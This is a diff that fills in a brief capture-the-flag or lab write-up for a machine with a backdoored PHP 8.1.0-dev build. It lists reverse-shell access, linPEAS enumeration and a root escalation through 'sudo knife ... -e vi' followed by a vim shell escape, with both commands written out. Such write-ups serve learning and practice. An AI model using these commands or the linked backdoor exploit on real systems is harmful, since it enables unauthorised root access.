@@ -3,11 +3,17 @@
 Easy
 
 Tags: 
+`PHP`
+`reverse shell`
+`linPEAS`
+`knife tool`
 
 
 ## Intro
 
-1. 
+1. Use vuln in php-8.1.0-dev to set up reverse shell
+2. Use linPEAS to search for possible paths to escalate privileges
+3. Use knife to open vim as root
 
 ## Exploit
 
@@ -19,6 +25,26 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
 ```
 
+### Install backdoor
+
 Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
 
 [PoC php-8.1.0 backdoor rce github](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)
+
+## Privilege Escalation
+
+Search for possible paths to escalate privileges
+
+[LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+
+/usr/bin/knife
+
+Use knife to open vim as root
+
+```
+sudo knife data bag create 1 2 -e vi
+```
+
+```
+:!bin/sh
+```
